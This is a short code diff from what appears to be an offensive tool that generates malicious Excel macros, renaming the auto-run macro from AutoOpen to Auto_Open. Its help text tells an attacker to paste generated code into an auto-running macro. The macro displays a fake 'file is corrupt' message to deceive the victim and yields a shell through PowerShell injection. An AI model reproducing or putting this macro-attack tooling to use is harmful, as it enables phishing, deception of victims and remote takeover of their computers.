@@ -75,7 +75,7 @@ def macro_help():
 				-----MACRO ATTACK INSTRUCTIONS----
 
 For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do 
-that, you will have a developer tab. Create a new macro, call it AutoOpen and paste the generated code 
+that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code 
 into that. This will automatically run. Note that a message will prompt to the user saying that the file 
 is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the 
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection 
@@ -204,7 +204,7 @@ def writefile(path, text):
 # generate full macro
 def genMacro(full_attack, LineLength=380):
     # start of the macro
-    macro_str = "Sub AutoOpen()\nDim x\nx = "
+    macro_str = "Sub Auto_Open()\nDim x\nx = "
 
     if LineLength is None:
         intLineLength = 380
